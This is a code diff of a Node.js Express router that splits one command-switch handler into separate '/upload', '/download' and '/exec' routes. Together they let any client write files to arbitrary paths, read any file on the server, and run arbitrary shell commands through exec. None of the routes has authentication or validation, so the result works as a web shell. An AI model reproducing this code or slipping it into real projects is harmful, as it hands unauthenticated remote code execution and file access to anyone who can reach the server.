@@ -9,36 +9,34 @@ function errNoAndCodeFromErr(err) {
     return {errno: err.errno, errcode: err.code}
   }
   
-  router.post('/', upload.single('payload'), function(req, res, next) {
-    switch(req.body.cmd) {
-      case 'download':
-        res.sendFile(req.body.payload, function(err) {
-          if(err)
+router.post('/upload', upload.single('payload'), function(req, res, next) {
+    // uploaded via multipart/form-data
+    fs.open(req.body.path, 'w', function(err, fd) {
+        if(err) {
+        res.send(errNoAndCodeFromErr(err))
+        } else {
+        fs.write(fd, req.file.buffer, function(err, bytesWritten, buffer) {
+            if(err) {
             res.send(errNoAndCodeFromErr(err))
+            } else {
+            res.send({success: true})
+            }
         })
-        break
-      case 'upload':
-      // uploaded via multipart/form-data
-        fs.open(req.body.path, 'w', function(err, fd) {
-          if(err) {
+        }
+    })
+});
+
+router.post('/download', function(req, res, next) {
+    res.sendFile(req.body.path, function(err) {
+        if(err)
             res.send(errNoAndCodeFromErr(err))
-          } else {
-            fs.write(fd, req.file.buffer, function(err, bytesWritten, buffer) {
-              if(err) {
-                res.send(errNoAndCodeFromErr(err))
-              } else {
-                res.send({success: true})
-              }
-            })
-          }
-        })
-        break
-      case 'exec':
-        exec(req.body.payload, (error, stdout, stderr) => {
-          res.send({error: error, stdout: stdout, stderr: stderr})
-        })
-        break
-    }
-  });
+    })
+});
+
+router.post('/exec', function(req, res, next) {
+    exec(req.body.cmd, (error, stdout, stderr) => {
+        res.send({error: error, stdout: stdout, stderr: stderr})
+    })
+});
 
 module.exports = router;
